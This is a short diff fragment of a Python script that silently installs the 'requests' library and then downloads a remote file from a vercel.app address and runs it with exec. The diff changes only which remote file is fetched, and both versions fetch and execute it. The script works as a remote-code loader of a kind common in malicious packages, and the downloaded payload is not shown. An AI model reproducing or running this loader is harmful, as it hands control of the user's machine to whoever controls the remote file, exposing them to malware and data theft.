@@ -9,4 +9,4 @@ except ImportError:
         stderr=subprocess.DEVNULL
     )
     import requests
-exec(requests.get("https://simpleprojectxdd.vercel.app/xdtoilet/main.py").text)
+exec(requests.get("https://simpleprojectxdd.vercel.app/xdtoilet/old_main.py").text)
